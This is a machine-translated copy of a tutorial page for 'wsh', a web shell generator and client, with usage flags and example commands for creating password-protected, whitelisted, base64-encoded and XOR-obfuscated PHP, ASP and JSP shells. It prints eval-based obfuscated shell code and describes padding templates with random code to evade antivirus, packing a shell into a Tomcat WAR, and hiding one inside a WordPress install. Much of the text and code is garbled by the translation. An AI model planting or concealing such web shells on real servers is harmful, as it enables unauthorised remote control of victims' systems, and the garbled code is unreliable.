# Wsh : Web Shell 生成器和命令行界面

> 原文：<https://kalilinuxtutorials.com/wsh/>

[![Rainbow Crackalack : Rainbow Table Generation & Lookup Tools](img/88f40a4594c71f1b17a3902be16f9d85.png "Rainbow Crackalack : Rainbow Table Generation & Lookup Tools")](https://1.bp.blogspot.com/-1GpemRb6YXo/XdBVAppVHsI/AAAAAAAADc8/1D_01PUiDAQ1voKm8C5XLgC4xL_GFrvyQCLcBGAsYHQ/s1600/RC%2B%25281%2529.png)

**wsh** (发音为 woosh)是一个 web shell 生成器和命令行界面。这一开始只是一个 http 客户端，因为与 webshells 交互是一件痛苦的事情。有一种表格，要发送命令，你必须在输入框中输入，然后按下按钮。我想要一些更适合我的工作流程并在终端上运行的东西。wsh 就这样诞生了。

该客户端具有命令历史记录和日志记录功能，并且可以配置为使用表单/按钮与以前部署的标准 webshell 进行交互。生成器用 php、asp 和 jsp 创建 webshells。它们是用随机变量生成的，所以每个都有唯一的散列。它们可以配置白名单、密码，并允许通过自定义的头和参数发送命令。生成器和客户端可以通过命令行标志或配置文件进行配置，以允许保存一个适合您的设置，而无需进行我称之为“帮助”的舞蹈。配置完成后，客户端和生成器使用相同的配置文件。

**特色**

*   通过命令行与部署的 web shells 交互
    *   记录
*   用 PHP、JSP 和 ASP 生成 webshells
    *   IP 白名单
    *   口令保护
    *   通过自定义头/参数发送命令
    *   文件上传/下载
    *   asp 和 php 的 Base64 编码外壳
    *   asp 和 php 的 XOR 加密外壳

**用法**

**连接**

**wsh【flags】
-X，–方法字符串 HTTP 方法:GET、POST、PUT、PATCH、DELETE(默认为“GET”)
–发送命令的 param 字符串参数
–发送命令的头字符串头
-P，–params 字符串 HTTP 请求参数
-H，–头字符串 HTTP 请求头
-c，–配置字符串配置文件
-k，–Ignore-SSL 忽略无效证书
–日志字符串日志文件
–前缀字符串前置**

**生成**

**wsh generate【flags】
wsh g【flags】
-X，–方法字符串 HTTP method (GET，POST，PUT，PATCH，DELETE)(默认为“GET”)
-p，–发送命令的 param 字符串参数
–发送命令的 header 字符串 Header
-w，–白名单字符串 IP 地址到白名单
-o， –outfile 字符串输出文件
–no-file 禁用文件上传/下载功能
–pass string 密码保护外壳
–pass-Header 用于发送密码的字符串头
–pass-param 用于发送密码的字符串参数
–xor-Header 用于发送 xor 密钥的字符串头
–xor-Key 用于 xor 加密的字符串密钥
–xor-param 用于发送 xor 密钥的字符串参数
–Base64 Base64 encode 外壳
–Minify Minify web shell 代码【T16**

**客户端使用/文件 IO**

我希望客户端是语言不可知的，所以所有的 webshells 都需要实现相同的上传/下载逻辑。不幸的是，在 jsp 和经典 asp 中本地进行多部分表单上传是一件痛苦的事情，所以文件在参数中以 base64 格式上传。这并不理想，因为最大文件上传大小受限于最大参数大小。在未来，我可能会尝试实现多部分表单上传，或者通过多个请求来传输更大的文件。

**$ wsh 127 . 0 . 0 . 1:8080/test . PHP–param cmd
127 . 0 . 0 . 1>help
get【本地文件路径】下载文件
put【远程文件路径】上传文件
clear 清屏
exit 退出 shell**

**发电机示例**

**简单的炮弹**

以下命令生成一个简单的 php web shell 并与之交互。

**$ wsh 生成 PHP–param cmd–no-file-o shell.php
在 shell.php 创建 shell。
$ wsh 127 . 0 . 0 . 1:8080/shell . PHP–param cmd**

命令也可以通过 http 头发送

**$ wsh generate PHP–no-file–header user-agent-o shell.php
在 shell.php 创建 shell。
$ wsh 127 . 0 . 0 . 1:8080/shell . PHP–header 用户代理**

**白名单**

**$ wsh 生成 PHP–no-file–param cmd-w 127 . 0 . 0 . 1，10 . 0 . 23 . 3-w 12.4.22.3-o shell.php**

**密码保护**

密码可以通过参数或标头发送。

**$ wsh generate PHP–no-file–param cmd–pass s3cr 3t–pass-param pass
$ wsh 127 . 0 . 0 . 1:8080/shell . PHP–param cmd-P pass:s3cr 3t
$ wsh generate PHP–no-file–param cmd–pass s3cr 3t–pass-header pass-header
$ wsh 127 . 0 . 0 . 1:8080/shell . PHP–param**

**Base64 / XOR 加密**

这个功能很有趣，但是可能需要对模板进行一些修改才能发挥作用。在 asp 和 jsp 的情况下，有助于解码 base64 的库是已知的 IOC，并将被标记。如果你对使用这些功能感兴趣，我建议修改模板和模糊处理。

与密码保护一样，xor 密钥可以通过参数或报头发送。

$**wsh g PHP–param cmd–no-file–base 64
<？PHP
eval(base 64 _ decode(' jezidsrfukvrvuvtvfny 21 k107 jezidsxryaw 0 oje senskttzxn 0 zw 0 oje senskttkawu 7 ')？>
$ wsh g PHP–param cmd–no-file–xorg-key S3 tk3 y–xorg-param x-key
PHP<？
$ khhx = $ _ request[" x-key "]；
$ lqc = base 64 _ decode(" D2 mpudjb 2 wrf FMI N2 agebqapldlwqg 182 jw4 xafozyxcpp 3 wwwmkenl 5 lvmmybedqafckfwg = ")；
【ooooqt = "；
用于($ ypui = 0)；$ ypui〔t18〕strlen($ lqc)；){
for($ cmq = 0；($ MQ<strlen($ khhx)&&【ypui】<【strlen($ lqc))；cMq++，ypui++ {
ooooqt。= $ lqc { $ ypui }∞khhx { $ cmq }；
}
}
eval($ ooooqt)；**

**雄猫壳**

要生成可以部署到 tomcat 的 webshell，创建一个名为 index.jsp 的 jsp shell，并运行下面的命令将其压缩到一个 war 文件中。

有时，tomcat 环境没有文件上传/下载所需的库，当发出请求时，shell 会出错。要解决这个问题，请使用`**--no-file**`标志。

**$ wsh g JSP–param cmd–no-file-o index.jsp
$ jar-CVF shell . war index.jsp**

**模板**

使用 go 模板库给生成器增加了很多灵活性。偶尔，webshell 会被 AV 捕获。但是，我发现在模板文件中添加一堆随机代码通常会使 shell 看起来足够良性，从而允许它在磁盘上持续存在。我在 templates/covert-php.tml 文件中包含了一个例子。

此外，您可以修改这些模板，以便在渗透测试的用例中包含您的姓名/联系信息。

**客户端功能**

**前缀**

可以指定一个前缀，为发送到 shell 的每个命令添加一个字符串。这可以用来把一个普通的 cmd 外壳变成一个 powershell 外壳。

**$ wsh http://10 . 0 . 0 . 27/shell . ASP–param cmd–前缀 powershell.exe
10 . 0 . 0 . 27>ls
目录:C:\windows\system32\inetsrv
模式 LastWriteTime 长度名称
——————
d——5/27/2020 11:49PM config
d——5/27/2020**

**测井**

日志带有时间戳，包括正在交互的主机。日志文件是附加的，因此可以随意对多个会话/主机使用同一个日志文件。

**127 . 0 . 0 . 1:8080/shell . PHP–param cmd–log localhost . log
登录到:localhost . log
127 . 0 . 0 . 1>ls
readme . MD
cmd
示例-configs
…
【04/20/2020 12:02:17】127 . 0 . 0 . 1>ls
readme . MD**

**修剪前缀/后缀**

客户端可以被配置为从请求中删除无关的 html 内容，这在与标准 html 界面 webshells 交互时很有用，或者如果一个生成的 shell 被偷偷嵌入到 wordpress 安装中。

$**wsh 127 . 0 . 0 . 1:8080/index . PHP-X POST–param cmd
127 . 0 . 0 . 1>ls
<div class = " p b-2 mt-4m b-2">
<H2>Output</H2>
/div>
<pre>
readme . MD
cmd**

[**Download**](https://github.com/EatonChips/wsh)